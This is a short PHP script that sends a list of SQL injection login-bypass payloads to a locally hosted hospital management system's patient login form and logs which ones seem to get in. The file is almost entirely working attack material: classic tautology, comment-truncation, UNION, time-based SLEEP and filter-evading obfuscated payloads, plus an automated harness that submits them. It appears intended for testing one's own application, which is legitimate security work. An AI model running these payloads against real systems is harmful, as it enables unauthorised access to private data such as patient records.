<?php
// Configuration
$loginUrl = 'http://localhost/hospital-management-system/patients/index.php'; // Replace with your actual login URL

// List of SQL injection payloads to test
$payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "admin' #",
    "' OR '' = '",
    "') OR ('1'='1",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' UNION SELECT NULL --",
    "' OR IF(1=1, SLEEP(5), 0) --",

    " admin')-- ",
    "admin')# ",
    "admin')/* ",
    "' OR 1=1 LIMIT 1 OFFSET 1 -- ",
    "' OR 1=1 LIMIT 1 OFFSET 0 -- ",
    "' OR EXISTS(SELECT * FROM users) -- ",


    " ' OR 0x31=0x31 -- ",
    "' AND 0x61=0x61 -- ",

    "'/*!50000OR*/1=1-- ",
    "'/**/OR/**/1=1-- ",


];

// Log file
$logFile = "injection_test_results.log";

// Run the tests
foreach ($payloads as $payload) {
    $data = [
        'username' => $payload,
        'password' => 'test'  // Or apply the payload in password field too
    ];

    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-type: application/x-www-form-urlencoded",
            'content' => http_build_query($data),
            'ignore_errors' => true
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($loginUrl, false, $context);

    $success = strpos($result, 'Welcome') !== false || strpos($result, 'dashboard') !== false;

    file_put_contents($logFile, "[" . date("Y-m-d H:i:s") . "] Payload: $payload => " . ($success ? "✅ Success (Vulnerable?)" : "❌ Failed (Safe)") . "\n", FILE_APPEND);
}

echo "Testing completed. Check '$logFile' for results.\n";
?>